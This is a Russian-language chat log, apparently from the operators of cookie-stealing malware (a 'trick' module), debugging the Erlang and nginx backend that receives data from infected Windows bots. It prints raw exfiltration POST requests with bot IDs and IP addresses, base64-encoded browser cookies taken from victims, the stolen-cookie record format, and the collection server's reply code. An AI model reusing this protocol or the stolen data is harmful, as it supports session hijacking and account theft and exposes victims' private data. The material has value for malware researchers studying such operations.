2021-08-30 08:45:02.583774	ttrr	buza	zulas: поясни мне проблему с крешем
2021-08-30 08:45:07.249355	buza	ttrr	почему это проблема?
2021-08-30 08:45:07.250264	ttrr	buza	почему это проблема?
2021-08-30 08:45:17.025047	buza	ttrr	потому что сервис падает и передача данных кончается?
2021-08-30 08:45:17.028868	ttrr	buza	потому что сервис падает и передача данных кончается?
2021-08-30 08:45:18.249731	ttrr	buza	я хз почему это проблема .. это к дефу
2021-08-30 08:45:29.889219	ttrr	buza	потому что в логи краши срет .. и всё
2021-08-30 08:45:37.388379	buza	ttrr	сервис остается жив?
2021-08-30 08:45:37.391858	ttrr	buza	сервис остается жив?
2021-08-30 08:45:40.577292	buza	ttrr	слушает дальше?
2021-08-30 08:45:40.579095	ttrr	buza	слушает дальше?
2021-08-30 08:45:41.780673	ttrr	buza	конечно
2021-08-30 08:45:46.967570	buza	ttrr	твою бать
2021-08-30 08:45:46.969195	ttrr	buza	твою бать
2021-08-30 08:45:52.599207	buza	ttrr	тогда хули мы тут обсуждаем?
2021-08-30 08:45:52.601935	ttrr	buza	тогда хули мы тут обсуждаем?
2021-08-30 08:46:00.269170	ttrr	buza	я хз . я это сразу говорил
2021-08-30 08:46:23.872654	ttrr	buza	Краш означает что пришло нечто и оно не попало в базу.
2021-08-30 08:46:41.500252	ttrr	buza	Т.к. не распозналось либой эрланга, верно?
2021-08-30 08:47:00.263487	ttrr	buza	нечто - это что угодно, собственно я и сказал что это что угодно, а нормальный POST оно распознает . и обработвает
2021-08-30 08:47:01.967848	buza	ttrr	значит мы обсуждаем потерю данных, но мы потеряли день, потому что в качестве примеров были приведены http2-запросы каких-то левых ботов
2021-08-30 08:47:01.980447	ttrr	buza	значит мы обсуждаем потерю данных, но мы потеряли день, потому что в качестве примеров были приведены http2-запросы каких-то левых ботов
2021-08-30 08:47:43.833130	buza	ttrr	[11:44:17] <buza> нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво\
2021-08-30 08:47:43.836700	ttrr	buza	[11:44:17] <buza> нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво\
2021-08-30 08:47:53.818490	buza	ttrr	сосредоточтесь на этом
2021-08-30 08:47:53.822991	ttrr	buza	сосредоточтесь на этом
2021-08-30 08:48:14.362542	buza	ttrr	zulas: найди в логах креш именно от данных модуля, чтобы там был HTTP/1.1
2021-08-30 08:48:14.365636	ttrr	buza	zulas: найди в логах креш именно от данных модуля, чтобы там был HTTP/1.1
2021-08-30 08:48:24.774121	buza	ttrr	и давайте разбирать нормальный пример
2021-08-30 08:48:24.784279	ttrr	buza	и давайте разбирать нормальный пример
2021-08-30 08:48:31.337635	ttrr	buza	значит для начала нужно обеспечить условия, чтобы только модуль трика мог ко мне данные передавать . иначе мы говорим о любом боте который шлет любое говно
2021-08-30 08:49:09.761602	buza	ttrr	деф что-то отрежет, но не думаю что всё
2021-08-30 08:49:09.762896	ttrr	buza	деф что-то отрежет, но не думаю что всё
2021-08-30 08:49:25.625168	buza	ttrr	по хттп1 тебе все равно будут лезть левые спайдеры
2021-08-30 08:49:25.642477	ttrr	buza	по хттп1 тебе все равно будут лезть левые спайдеры
2021-08-30 08:51:43.324723	ttrr	buza	Есть вариант передать любым способом ключ в бота, и сделать на эрланге проверку, что ключ в запросе совпадает с ключем в базе
2021-08-30 08:52:06.211563	buza	ttrr	чтобы что?
2021-08-30 08:52:06.213742	ttrr	buza	чтобы что?
2021-08-30 08:52:29.669524	ttrr	buza	отсечь все данные которые не относятся к трику.
2021-08-30 08:52:52.945157	buza	ttrr	вообще-то у бэка есть штатный механизм для этого
2021-08-30 08:52:52.946847	ttrr	buza	вообще-то у бэка есть штатный механизм для этого
2021-08-30 08:53:08.918577	buza	ttrr	он парсит запрос и вытаскивает ID бота из него
2021-08-30 08:53:08.919924	ttrr	buza	он парсит запрос и вытаскивает ID бота из него
2021-08-30 08:53:35.691432	buza	ttrr	это и есть ключ, 90% запросов отсечется по невалидному URI с отсутствующим ид бота и группы
2021-08-30 08:53:35.693052	ttrr	buza	это и есть ключ, 90% запросов отсечется по невалидному URI с отсутствующим ид бота и группы
2021-08-30 08:53:48.790910	buza	ttrr	остальные 9% левых запросов отсечется по неправдоподобному ИД бота
2021-08-30 08:53:48.796349	ttrr	buza	остальные 9% левых запросов отсечется по неправдоподобному ИД бота
2021-08-30 08:53:54.541526	buza	ttrr	но можно и падать
2021-08-30 08:53:54.543024	ttrr	buza	но можно и падать
2021-08-30 08:56:42.266761	ttrr	buza	падает потому что ему протокол непонятен - он ожидает одно, а нихера не приходит .
2021-08-30 08:57:05.201793	ttrr	buza	когда протокол понятен - то и соответствущя реакция на него независимо правильный он ( от нас) или не правильны (от чужих)
2021-08-30 08:57:35.261983	ttrr	buza	вот когда отсечет .. тогда можно говорить о чем . а если падает только на левых ..
2021-08-30 09:00:25.674576	buza	ttrr	еще раз, какую проблему мы решаем?
2021-08-30 09:00:25.676210	ttrr	buza	еще раз, какую проблему мы решаем?
2021-08-30 09:03:21.871866	buza	ttrr	то что бэк падает на левых данных это не проблема. Он что-то не может распарсить, ну и ладно
2021-08-30 09:03:21.877805	ttrr	buza	то что бэк падает на левых данных это не проблема. Он что-то не может распарсить, ну и ладно
2021-08-30 09:03:46.741451	ttrr	buza	я пока вижу левые данные только
2021-08-30 09:03:53.973178	buza	ttrr	driver: ?
2021-08-30 09:03:53.978069	ttrr	buza	driver: ?
2021-08-30 09:10:20.681922	ttrr	buza	Вообще про краши говорил дэф.
2021-08-30 09:10:34.438011	ttrr	buza	Я думаю что нам надо закрыть логи
2021-08-30 09:11:15.487084	ttrr	buza	Чтобы можно было понять что приходит на бэк. Чтобы если краши появляются можно было понять что именно причина
2021-08-30 09:11:29.533713	ttrr	buza	У нас есть поток тестовых данных которые всегда ошибки вызывают.
2021-08-30 09:13:13.920196	ttrr	buza	Например я часто вычищаю из базы какие то записи которые явно не в тему. Их там 6 штук по кукам, но они все время появляются и дальше никогда не проходят
2021-08-30 09:14:09.943832	ttrr	buza	То что сейчас сделали с нджинксом - задачу решает пока что.
Надо только более полные логи настроить
2021-08-30 09:14:23.958346	ttrr	buza	Чтобы тело пост запросов можно было видеть.
2021-08-30 09:16:17.559565	buza	ttrr	ну то есть ты говоришь о том, что нужно логирование запросов, а его нету. Верно?
2021-08-30 09:16:17.563163	ttrr	buza	ну то есть ты говоришь о том, что нужно логирование запросов, а его нету. Верно?
2021-08-30 09:21:45.713702	ttrr	buza	Да
2021-08-30 09:21:52.696087	ttrr	buza	Сейчас это главное.
2021-08-30 09:24:33.033530	ttrr	buza	Вся история про эту конфу была с сообщения что нужно менять либу парсинга чтобы логи сделать, о чем нам зулас сообщил, но дэф придумал просто поставить проксю нджинкс. Так что я честно не очень понимаю, каких то правок пока нет больше в бэке.
Но есть проблема, что часть данных не приходит и вот нужно понять почему и тогда дальше думать.
2021-08-30 09:26:50.170735	ttrr	buza	логи сделаны .. я приводил выдержки оттуда
2021-08-30 09:27:47.886558	ttrr	buza	для меня непонятно кто это генерит .. но факт в том что либа не может понять что это ... поэтому краши .. 
хттп1 она обрабатыват .. хттп2 у нас нет .. соотвественно давайте хттп2 просто закроем и всё
2021-08-30 09:27:59.134036	ttrr	buza	тогда мы сузим круг возможных проблем и найдем решение для них
2021-08-30 09:28:46.217650	ttrr	buza	краши по факту могут быть всегда -- всмысли когда какой-то левый протокол на порт коннектится .. то может быть краш в лог . это не значит что сервис в дауне . это просто значит что один именно этот запрос не вызвал нужной реакции сервера
2021-08-30 09:36:07.625411	ttrr	buza	> соотвественно давайте хттп2 просто закроем и всё 
точнее закроем все что не хттп1
2021-08-30 09:36:26.646915	ttrr	buza	я не думаю что у Nginx проблемы могут быть с такой логикой .. правильно ?
2021-08-30 09:43:57.353525	ttrr	buza	всем привет
2021-08-30 09:44:05.521783	ttrr	buza	вот для этого я и делал нджинк
2021-08-30 09:44:20.139454	ttrr	buza	но он как драйвер сказал не правильно проксировал
2021-08-30 09:44:24.802456	ttrr	buza	сейчас я с этим разберусь
2021-08-30 09:44:34.746287	ttrr	buza	+ сделаю только хттп1
2021-08-30 09:44:44.412954	ttrr	buza	+ логирование запросов и тела
2021-08-30 13:22:35.597199	ttrr	buza	сделал логирование
2021-08-30 13:22:38.302476	ttrr	buza	/var/log/nginx/access.log
2021-08-30 13:22:59.687873	ttrr	buza	все выводит что проходит через нджинкс
2021-08-30 13:23:34.903237	ttrr	buza	выпилить хттп2 не так просто, надо собирать свой дистр
2021-08-30 13:23:45.775716	ttrr	buza	давайте начнем пока с ищучения лога
2021-08-30 13:24:22.988575	ttrr	buza	если деро крашится значит нджинкс примет код не 200 и по нему можно увидеть какие там данные
2021-08-30 13:28:03.099692	ttrr	buza	да и если есть там реальный срач, давайте напишите мне регулярку по которой я отсеку в нджинксе все кроме норм запросов
2021-08-30 14:30:22.899238	ttrr	buza	все видят что я пишу?
2021-08-30 14:30:26.956729	ttrr	buza	смотрите?
2021-08-30 14:30:38.866200	ttrr	buza	Я вижу.
2021-08-30 14:31:11.732098	ttrr	buza	Я пока не понял как мне сообщение посмотреть и тело запроса.
\x16\x03\x03\x00\xC2\x01\x00\x00\xBE\x03\x03a,O\xBC\xF5\xC6\xCFw\x958\xE8\x15O@\xBD)\xC5\xD3\xCA\x81\xE2\xA7i\xAF\xCCg\xA9[6k_/\x00\x00&\xC0,\xC0+\xC00\xC0/\xC0$\xC0#\xC0(\xC0'\xC0
2021-08-30 14:31:31.402776	ttrr	buza	Вот такое есть, это бинарные данные?
2021-08-30 14:32:37.711356	ttrr	buza	вот есть так как ты написал
2021-08-30 14:32:44.615845	ttrr	buza	в не понятной кодировке
2021-08-30 14:32:47.117526	ttrr	buza	а есть норм
2021-08-30 14:32:53.474404	ttrr	buza	200.58.180.138 -  [30/Aug/2021:17:31:45 +0300] "POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1" 403 182 "" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64
; Trident/7.0; .NET4.0E; .NET4.0C; InfoPath.3; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)" "-----------KRLRMIKEGVGXNTPQ\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nUtente2|Ch
rome|dGFncy5hZHNhZmV0eS5uZXQ=|RElE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|SURU|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrom
e|dGFncy5hZHNhZmV0eS5uZXQ=|VUlE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfZGlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659
0957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfaWR0|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfdWlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659095
7|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|dg==|Mg==|1546590957|2147483641|Lw==\r\nUtente2|Chrome|Lmdvb2dsZS5jb20=|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218723|2146723192|Lw==\r\nUtente
2|Chrome|Lmdvb2dsZS5pdA==|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|LnlvdXR1YmUuY29t|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|Lm
ludGVudGlxLmNvbQ==|SVF2ZXI=|MS45|1562134121|1877494136|Lw==\r\nUtente2|Chrome|LmhvdGVscy5jb20=|X2Nsc192|MGE5ZTdlN2UtZGY1Mi00YWQzLWI0YjItY2UxZGI0MGQ1MWU5|1562134143|1719814143|Lw==\r\nUtente2|Chrome|LnRya
XZhZ28uY29t|Y3RpZA==|SzRETTU1bm1JMzdIQzVudXZUTXBveFhROU4=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|d3d3LnRyaXZhZ28uaXQ=|ZnR2|JTdCJTIyZnR2JTIyJTNBJTIyMjAxOTA3MDMwNjA4NDAlMjIlMkMlMjJsdHYlMjIlM0ElMjIyMD
E5MDcwMzA2MDg0MCUyMiUyQyUyMmVwJTIyJTNBOTk5OSUyQyUyMmNudHYlMjIlM0ExJTJDJTIyY250YyUyMiUzQTElMkMlMjJjbnRjcyUyMiUzQTElMkMlMjJmZXAlMjIlM0E5OTk5JTJDJTIydmMlMjIlM0EwJTJDJTIyY3RsJTIyJTNBOTk5JTJDJTIyY3RmJTIyJTNBO
Tk5JTJDJTIyaXRlbSUyMiUzQTIzMTMxNjglMkMlMjJwYXRoJTIyJTNBNDU4MTclMkMlMjJwYXRoMiUyMiUzQW51bGwlN0Q=|1562134136|2147483644|Lw==\r\nUtente2|Chrome|Lnd3dy50cml2YWdvLml0|aW50ZW50X21lZGlhX3ByZWZz||1562134121|-210
1681175|Lw==\r\nUtente2|Chrome|ZHVzLnRyaXZhZ28uY29t|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|c2VjZGUudHJpdmFnby5jb20=|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134120|2147483643|Lw==\r\
nUtente2|Chrome|LnRyaXZhZ28uY29t|dGlk|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dGlk|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|1562134117|2147483643|Lw
==\r\nUtente2|Chrome|LnRyaXZhZ28uY29t|dHJ2X3RpZA==|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dHJ2X3RpZA==|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|156

...
...........
2021-08-30 14:33:11.250580	ttrr	buza	хооооотя код 403
2021-08-30 14:33:14.507450	ttrr	buza	почему
2021-08-30 14:33:57.057800	ttrr	buza	zulas: давай разбираться
2021-08-30 14:36:02.437819	buza	ttrr	POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1
2021-08-30 14:36:02.442014	ttrr	buza	POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1
2021-08-30 14:36:21.824761	buza	ttrr	это наш запрос, если не ошибаюсь это куки
2021-08-30 14:36:21.829456	ttrr	buza	это наш запрос, если не ошибаюсь это куки
2021-08-30 14:36:35.157097	buza	ttrr	zulas: поясни почему 403
2021-08-30 14:36:35.160082	ttrr	buza	zulas: поясни почему 403
2021-08-30 14:38:38.676369	ttrr	buza	buza: давай я тебе скину креды, может ты тоже посмотришь логи?
2021-08-30 14:38:38.680648	ttrr	buza	В конце данные обрезаны
2021-08-30 14:38:49.484650	ttrr	buza	просто чувствую что гл=де то рядом ответ
2021-08-30 14:38:54.994184	ttrr	buza	Это так скопировалось?
2021-08-30 14:39:04.025581	ttrr	buza	driver: это я обрезал, там дохрена
2021-08-30 14:39:24.311111	ttrr	buza	Ок
2021-08-30 14:39:40.409145	buza	ttrr	defender: в последний раз когда я этим занимался (еще будучи разработчиком того самого модуля который эти данные шлет), коды ошибки приходили от бэкенда в случае если ему данные не нравились
2021-08-30 14:39:40.411871	ttrr	buza	defender: в последний раз когда я этим занимался (еще будучи разработчиком того самого модуля который эти данные шлет), коды ошибки приходили от бэкенда в случае если ему данные не нравились
2021-08-30 14:40:13.904066	buza	ttrr	т.е. тут нужно указание от зуласа, начиная с какого смещения в этом запросе данные невалидны (по мнению парсящей их библиотеки)
2021-08-30 14:40:13.908095	ttrr	buza	т.е. тут нужно указание от зуласа, начиная с какого смещения в этом запросе данные невалидны (по мнению парсящей их библиотеки)
2021-08-30 14:41:26.284013	ttrr	buza	так да, но пока он думает, можетт у тебя мысли будут
2021-08-30 14:42:45.466686	ttrr	buza	403 Forbidden шлет во многих случаях .. самый общий это неверный URL .. потом всякие баны и т.п.
2021-08-30 14:43:27.703389	ttrr	buza	у тебя есть конкретный сервер с конкретной базой и софтом + логи
2021-08-30 14:43:31.447183	ttrr	buza	рзберись плиз
2021-08-30 14:43:35.530250	ttrr	buza	для 84 команды конкретно тут может быть что он ожидает данные формы .. multipart но там ничего нет
2021-08-30 14:43:54.456637	ttrr	buza	я сваливаю сейчас . смогу только завтра . так что сорян
2021-08-30 14:44:08.987313	ttrr	buza	кто в жабе кодер модуля?
2021-08-30 14:44:21.704966	ttrr	buza	надо добавить его сюда
2021-08-30 14:44:40.865706	ttrr	buza	zulas: утром?
2021-08-30 14:45:04.425860	ttrr	buza	ога
2021-08-30 14:45:04.868199	ttrr	buza	чтобы сюда кодера модуля подтянуть к этому времени
2021-08-30 14:46:32.017842	ttrr	buza	еще надо в лог писать длину пост данных .. потому что у меня лимит 64 кб
2021-08-30 14:46:43.415000	ttrr	buza	[19:43:23] <dgh> Там надо посмотреть весь лог, суть в том что должно быть по 8 полей 
[19:43:39] <dgh> И точно такую же ошибку нам выдавало когда их было больше или меньше 
[19:43:52] <dgh> И возвращало типа что то Missmatch parametr count 
[19:43:55] <dgh> В ответе
2021-08-30 14:46:48.424194	ttrr	buza	таймаут по чтению - 50 секунд
2021-08-30 14:46:58.654842	ttrr	buza	Это еще можно проверить
2021-08-30 14:48:08.520291	ttrr	buza	да .. надо логировать ответ сервера .. там 403 может быть с пояснением
2021-08-30 14:48:52.503866	ttrr	buza	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
такие колонки должны быть
2021-08-30 14:50:31.729838	ttrr	buza	у меня может в глазах двоится .. но я насчитал в запросе 15 колонов в пост-дата
2021-08-30 14:50:37.210271	ttrr	buza	колонок
2021-08-30 14:50:57.650526	ttrr	buza	Я по этому куску разбил по 8 везде
2021-08-30 14:51:05.433476	ttrr	buza	Или ты полный лог глядишь
2021-08-30 14:51:06.972663	ttrr	buza	?
2021-08-30 14:51:14.894679	ttrr	buza	хотя нет .. 8 )
2021-08-30 14:51:36.060257	ttrr	buza	То что в лимит уперлось кстати вероятно.
2021-08-30 14:51:39.707724	ttrr	buza	короче надо ответ сервера логировать . будет понятнее . .есть такая возможсность ? )
2021-08-30 14:51:39.739503	ttrr	buza	Тоже
2021-08-30 14:51:51.345055	ttrr	buza	и размер запроса
2021-08-30 14:52:13.549245	ttrr	buza	свалил )
2021-08-30 14:54:50.403999	buza	ttrr	сейчас автор модуля должен зайти
2021-08-30 14:54:50.406730	ttrr	buza	сейчас автор модуля должен зайти
2021-08-31 08:20:34.373786	ttrr	buza	ну и ?
2021-08-31 08:20:44.477178	ttrr	buza	одному мне больше всез надо ?
2021-08-31 08:21:25.222020	buza	ttrr	со вчера вечера что-то писали тут?
2021-08-31 08:21:25.223342	ttrr	buza	со вчера вечера что-то писали тут?
2021-08-31 08:23:54.165734	buza	ttrr	zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком
2021-08-31 08:23:54.167365	ttrr	buza	zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком
2021-08-31 08:24:17.353681	ttrr	buza	А тут истории нет?
Писал по поводу новых полей в записи куки
2021-08-31 08:24:26.068492	buza	ttrr	нету истории
2021-08-31 08:24:26.069697	ttrr	buza	нету истории
2021-08-31 08:26:45.177754	buza	ttrr	ну так на чем остановились?
2021-08-31 08:26:45.179401	ttrr	buza	ну так на чем остановились?
2021-08-31 08:27:19.301382	buza	ttrr	я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так
2021-08-31 08:27:19.302779	ttrr	buza	я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так
2021-08-31 08:27:38.956521	ttrr	buza	а я попросил расширить лог . чтобы логировало ответ
2021-08-31 08:27:51.221395	ttrr	buza	и размер запроса
2021-08-31 08:29:36.037979	buza	ttrr	а ты steller ?
2021-08-31 08:29:36.041557	ttrr	buza	а ты steller ?
2021-08-31 08:31:18.948820	ttrr	buza	Писал по поводу новых полей в записи куки
2021-08-31 08:33:03.541030	buza	ttrr	что именно?
2021-08-31 08:33:03.541972	ttrr	buza	что именно?
2021-08-31 08:33:15.476311	ttrr	buza	403 встречалась раньше ошибка
-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="data"

user|Chrome|.google.com|ANID|	djEw171ep2SDF+UMAcWRRWBcsbp5H34/V0frREuTTKAE2F3BXw3fVVHhgYgcKidlSSPxtTs32WPiqcV/p021G67RLpNXgRDrMqljrJ16Ml1Ckwz2a2URAQ==|1588241125|1651313125|/
user|Chrome|.register.com|__utma|	djEwnpzEp2a3+eOKByaEj0nLtLL7HGvIusWq1obAuia9wTCz3pPEUF6A+gFpZ3LHPf2GSueVelCwgrXMR96kV8MmLcClokQ=|1588241143|1651313173|/

-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="source"

Chrome cookies
-----------CJLVIYOINTQPMYSU--

403
Mismatch parameters count!
2021-08-31 08:33:43.135763	buza	ttrr	zulas: сколько полей в куки у тебя сейчас?
steller: а у тебя?
2021-08-31 08:33:43.139683	ttrr	buza	zulas: сколько полей в куки у тебя сейчас?
steller: а у тебя?
2021-08-31 08:34:59.534227	ttrr	buza	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
2021-08-31 08:35:00.849091	ttrr	buza	вот поля
2021-08-31 08:35:14.270186	ttrr	buza	разделитель |
2021-08-31 08:35:28.665073	ttrr	buza	Разработчик админки планирует добавить 2 поля secure, httponly в конец записи.
Сейчас:
Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path
2021-08-31 08:35:46.675734	ttrr	buza	разделители строк: [ <<10>>, <<13,10>>]
2021-08-31 08:37:31.165932	ttrr	buza	403 была, когда некоторые поля не кодировались в В64. В отстойнике они безусловно декодировались.
2021-08-31 08:38:28.753098	ttrr	buza	А что по поводу максимального размера данных, он ограничен 64КБ будет?
2021-08-31 08:39:10.940777	ttrr	buza	{read_length, 64000},
{read_timeout, 50000}
я могу и больше сделать
2021-08-31 08:39:15.178535	ttrr	buza	таковы требоания были
2021-08-31 08:40:40.541531	ttrr	buza	50000 это в миллисекундах
2021-08-31 08:43:47.769105	ttrr	buza	В модуле нет такого ограничения. Можно разбить на несколько запросов, в принципе.
А какие ошибки отстойник может отдавать? Их желательно как-то обрабатывать.
403 добавил в обработку. На модуль приходили ещё 404 и 500. 500, видимо, от прокладки.
2021-08-31 08:45:02.924223	ttrr	buza	при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?
2021-08-31 08:45:20.941683	ttrr	buza	403 ошибка формата данных?
2021-08-31 08:45:42.353766	ttrr	buza	просо 200 бывает без /1/ ?
2021-08-31 08:45:46.773141	ttrr	buza	просто
2021-08-31 08:46:17.064752	ttrr	buza	zulas:
2021-08-31 08:47:07.168892	ttrr	buza	зачем этот /1/ ?
2021-08-31 08:47:10.001467	ttrr	buza	reply(not_found, Req) ->
 { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
 Req1;

reply(forbidden, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
 Req1;

reply(missing_data, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
 Req1;

reply(missing_keys, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
 Req1;

reply(missing_parameters, Req) ->
 {ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
 Req1;

reply(request_timeout, Req) ->
 {ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
 Req1;
2021-08-31 08:47:16.136005	ttrr	buza	вот такие ошибки бывают
2021-08-31 08:47:22.018129	ttrr	buza	текст у вас отобразился ?
2021-08-31 08:47:31.376763	ttrr	buza	а то у меня пиджин -- и нифига
2021-08-31 08:47:40.875003	ttrr	buza	отразился
2021-08-31 08:48:11.905979	ttrr	buza	200 бывает без /1/ ?
2021-08-31 08:48:50.548215	ttrr	buza	по коду вроде не бывает
2021-08-31 08:48:57.440328	ttrr	buza	почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?
2021-08-31 08:49:06.639192	buza	ttrr	[11:47:07] <hof> зачем этот /1/ ?
так по тз
2021-08-31 08:49:06.640633	ttrr	buza	[11:47:07] <hof> зачем этот /1/ ?
так по тз
2021-08-31 08:49:25.813522	ttrr	buza	это типа следующая команда для клиента
2021-08-31 08:49:29.557565	ttrr	buza	т.е. 200 без /1/ не бывает?
2021-08-31 08:49:55.932124	ttrr	buza	не бывает
2021-08-31 08:50:06.568416	ttrr	buza	ок, отлично
2021-08-31 08:50:53.719659	ttrr	buza	zulas: А сейчас логирование запросов http есть, их можно проверить?
2021-08-31 08:51:29.471232	ttrr	buza	есть
2021-08-31 08:52:48.117050	ttrr	buza	Скинь тогда проблемные запросы.
2021-08-31 08:58:25.520360	ttrr	buza	2021-08-31 11:52:22.415 [info] <0.6857.3> Data: <<"POST /tot57/WIN-U4U2CDE99LP_W617601.8C95D48B33FF1976677889D52ABB8859/84/ HTTP/1.0\r\nHost: 203.76.105.227\r\nX-Real-IP: 203.76.105.227\r\nX-Forwarded-For: 203.76.105.227\r\nConnection: close\r\nContent-Length: 11059\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=---------MOBMWAMXGTKVMATK\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\r\nCache-Control: no-cache\r\n\r\n-----------MOBMWAMXGTKVMATK\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L2NvbXBsZXRlL3NlYXJjaA==\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L3NlYXJjaA==\r\nAdministrador|C...">>
 State: {state,#Port<0.108426>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630399947415}
 ReqEmpty 0
2021-08-31 11:52:22.416 [critical] <0.6857.3>@http_handler:handle:33 Error {badmatch,false} [{base64,decode_binary,2,[{file,"base64.erl"},{line,212}]},{http_handler,'-save84/3-fun-4-',5,[{file,"src/http_handler.erl"},{line,329}]},{lists,foreach,2,[{file,"lists.erl"},{line,1338}]},{http_handler,save84,3,[{file,"src/http_handler.erl"},{line,325}]},{http_handler,handle,2,[{file,"src/http_handler.erl"},{line,30}]},{cowboy_handler,handler_handle,4,[{file,"src/cowboy_handler.erl"},{line,111}]},{cowboy_protocol,execute,4,[{file,"src/cowboy_protocol.erl"},{line,443}]}]
2021-08-31 08:58:38.141862	ttrr	buza	вот . не может басе64 декодировать
2021-08-31 08:58:42.753255	ttrr	buza	не знаю какое поле
2021-08-31 08:59:10.718399	ttrr	buza	крашей больше нет
2021-08-31 08:59:29.607972	ttrr	buza	всмысли тех что хттп2
2021-08-31 09:05:10.043063	ttrr	buza	Это старые данные. Сейчас модуль отправляет Username, Domain, Cookie_name, Cookie_value, Path  в В64
